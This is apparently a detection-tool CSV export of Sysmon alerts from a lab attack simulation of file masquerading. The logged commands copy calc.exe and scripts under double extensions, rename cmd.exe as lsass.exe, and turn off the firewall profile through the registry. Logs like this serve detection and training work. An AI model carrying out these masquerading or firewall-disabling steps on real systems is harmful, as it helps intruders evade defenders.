%temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 540 ¦ PGUID: E9F06A57-9549-694A-CF02-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:41.966","proc_creation_win_susp_script_exec_from_temp.yml","5bbe7c88-c377-bda2-9b45-91a58165367b","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:42.205 +01:00","Suspicious Script Execution From Temp Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059","sysmon",172685,"Cmdline: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.pdf.ps1 ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 484 ¦ PGUID: E9F06A57-954A-694A-D002-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:42.204","proc_creation_win_susp_script_exec_from_temp.yml","5bbe7c88-c377-bda2-9b45-91a58165367b","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:42.421 +01:00","Suspicious Script Execution From Temp Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059","sysmon",172687,"Cmdline: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.rtf.ps1 ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8344 ¦ PGUID: E9F06A57-954A-694A-D102-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:42.420","proc_creation_win_susp_script_exec_from_temp.yml","5bbe7c88-c377-bda2-9b45-91a58165367b","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:16:22.002 +01:00","System File Execution Location Anomaly","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas","T1036","sysmon",172706,"Cmdline: C:\lsm.exe /c echo T1036.003 ¦ Proc: C:\lsm.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy C:\Windows\System32\cmd.exe C:\lsm.exe && C:\lsm.exe /c echo T1036.003 > C:\T1036.003.txt ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 6408 ¦ PGUID: E9F06A57-9625-694A-E002-000000002300 ¦ ParentPID: 1012 ¦ ParentPGUID: E9F06A57-9625-694A-DF02-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:16:21.998","proc_creation_win_susp_system_exe_anomaly.yml","212d94da-156c-da97-77ea-52dc9e196e7b","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:18:25.060 +01:00","System File Execution Location Anomaly","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas","T1036","sysmon",172711,"Cmdline: C:\WINDOWS\Temp\lsass.exe /B ¦ Proc: C:\Windows\Temp\lsass.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe && %SystemRoot%\Temp\lsass.exe /B ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8880 ¦ PGUID: E9F06A57-96A1-694A-E502-000000002300 ¦ ParentPID: 3648 ¦ ParentPGUID: E9F06A57-96A0-694A-E402-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:18:25.056","proc_creation_win_susp_system_exe_anomaly.yml","212d94da-156c-da97-77ea-52dc9e196e7b","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:41.684 +01:00","Potential Dropper Script Execution Via WScript/CScript","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.005 ¦ T1059.007","sysmon",172680,"Cmdline: ""C:\WINDOWS\System32\WScript.exe"" ""C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.xls.vbs"" ¦ Proc: C:\Windows\System32\wscript.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4556 ¦ PGUID: E9F06A57-9549-694A-CC02-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Microsoft ® Windows Based Script Host ¦ Product: Microsoft ® Windows Script Host ¦ Company: Microsoft Corporation ¦ Hashes: MD5=A90DAAA8EE522A533588B9E63C55F605,SHA256=32B34E9FE145A550782EC2AA982894D2F183F4A7068641CF98A02ACE14DD999A,IMPHASH=72B04FD87C15A84B6C876E835F21F6E1","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 5.812.10240.16384 ¦ IntegrityLevel: High ¦ OriginalFileName: wscript.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:41.597","proc_creation_win_wscript_cscript_dropper.yml","be0d9a46-d61c-a6a5-f99c-8a263c95037a","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:41.865 +01:00","Potential Dropper Script Execution Via WScript/CScript","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.005 ¦ T1059.007","sysmon",172681,"Cmdline: ""C:\WINDOWS\System32\WScript.exe"" ""C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.xlsx.vbs"" ¦ Proc: C:\Windows\System32\wscript.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4060 ¦ PGUID: E9F06A57-9549-694A-CD02-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Microsoft ® Windows Based Script Host ¦ Product: Microsoft ® Windows Script Host ¦ Company: Microsoft Corporation ¦ Hashes: MD5=A90DAAA8EE522A533588B9E63C55F605,SHA256=32B34E9FE145A550782EC2AA982894D2F183F4A7068641CF98A02ACE14DD999A,IMPHASH=72B04FD87C15A84B6C876E835F21F6E1","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 5.812.10240.16384 ¦ IntegrityLevel: High ¦ OriginalFileName: wscript.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:41.864","proc_creation_win_wscript_cscript_dropper.yml","be0d9a46-d61c-a6a5-f99c-8a263c95037a","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:41.928 +01:00","Potential Dropper Script Execution Via WScript/CScript","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.005 ¦ T1059.007","sysmon",172682,"Cmdline: ""C:\WINDOWS\System32\WScript.exe"" ""C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.png.vbs"" ¦ Proc: C:\Windows\System32\wscript.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4800 ¦ PGUID: E9F06A57-9549-694A-CE02-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Microsoft ® Windows Based Script Host ¦ Product: Microsoft ® Windows Script Host ¦ Company: Microsoft Corporation ¦ Hashes: MD5=A90DAAA8EE522A533588B9E63C55F605,SHA256=32B34E9FE145A550782EC2AA982894D2F183F4A7068641CF98A02ACE14DD999A,IMPHASH=72B04FD87C15A84B6C876E835F21F6E1","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 5.812.10240.16384 ¦ IntegrityLevel: High ¦ OriginalFileName: wscript.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:41.926","proc_creation_win_wscript_cscript_dropper.yml","be0d9a46-d61c-a6a5-f99c-8a263c95037a","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:41.684 +01:00","Cscript/Wscript Uncommon Script Extension Execution","high","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.005 ¦ T1059.007","sysmon",172680,"Cmdline: ""C:\WINDOWS\System32\WScript.exe"" ""C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.xls.vbs"" ¦ Proc: C:\Windows\System32\wscript.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4556 ¦ PGUID: E9F06A57-9549-694A-CC02-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Microsoft ® Windows Based Script Host ¦ Product: Microsoft ® Windows Script Host ¦ Company: Microsoft Corporation ¦ Hashes: MD5=A90DAAA8EE522A533588B9E63C55F605,SHA256=32B34E9FE145A550782EC2AA982894D2F183F4A7068641CF98A02ACE14DD999A,IMPHASH=72B04FD87C15A84B6C876E835F21F6E1","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 5.812.10240.16384 ¦ IntegrityLevel: High ¦ OriginalFileName: wscript.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:41.597","proc_creation_win_wscript_cscript_uncommon_extension_exec.yml","294e2cac-d4bb-9790-f4c2-512f53b89d59","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:41.865 +01:00","Cscript/Wscript Uncommon Script Extension Execution","high","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.005 ¦ T1059.007","sysmon",172681,"Cmdline: ""C:\WINDOWS\System32\WScript.exe"" ""C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.xlsx.vbs"" ¦ Proc: C:\Windows\System32\wscript.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4060 ¦ PGUID: E9F06A57-9549-694A-CD02-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Microsoft ® Windows Based Script Host ¦ Product: Microsoft ® Windows Script Host ¦ Company: Microsoft Corporation ¦ Hashes: MD5=A90DAAA8EE522A533588B9E63C55F605,SHA256=32B34E9FE145A550782EC2AA982894D2F183F4A7068641CF98A02ACE14DD999A,IMPHASH=72B04FD87C15A84B6C876E835F21F6E1","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 5.812.10240.16384 ¦ IntegrityLevel: High ¦ OriginalFileName: wscript.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:41.864","proc_creation_win_wscript_cscript_uncommon_extension_exec.yml","294e2cac-d4bb-9790-f4c2-512f53b89d59","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:41.928 +01:00","Cscript/Wscript Uncommon Script Extension Execution","high","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.005 ¦ T1059.007","sysmon",172682,"Cmdline: ""C:\WINDOWS\System32\WScript.exe"" ""C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.png.vbs"" ¦ Proc: C:\Windows\System32\wscript.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4800 ¦ PGUID: E9F06A57-9549-694A-CE02-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Microsoft ® Windows Based Script Host ¦ Product: Microsoft ® Windows Script Host ¦ Company: Microsoft Corporation ¦ Hashes: MD5=A90DAAA8EE522A533588B9E63C55F605,SHA256=32B34E9FE145A550782EC2AA982894D2F183F4A7068641CF98A02ACE14DD999A,IMPHASH=72B04FD87C15A84B6C876E835F21F6E1","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 5.812.10240.16384 ¦ IntegrityLevel: High ¦ OriginalFileName: wscript.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:41.926","proc_creation_win_wscript_cscript_uncommon_extension_exec.yml","294e2cac-d4bb-9790-f4c2-512f53b89d59","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:09:33.848 +01:00","Disable Microsoft Defender Firewall via Registry","med","DESKTOP-G2OBL3D","Sysmon",13,"Evas","T1562.004","sysmon",172653,"EventType: SetValue ¦ RegKey: HKLM\System\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile\EnableFirewall ¦ Details: DWORD (0x00000000) ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 1588 ¦ PGUID: E9F06A57-7C75-694A-1E00-000000002300 ¦ User: NT AUTHORITY\LOCAL SERVICE","RuleName: T1089 ¦ UtcTime: 2025-12-23 13:09:33.848","registry_set_disable_defender_firewall.yml","0904c1e9-81c6-26ad-f68e-8bb29bddd5ab","C:\Tools\Logs\mc_defense.evtx"
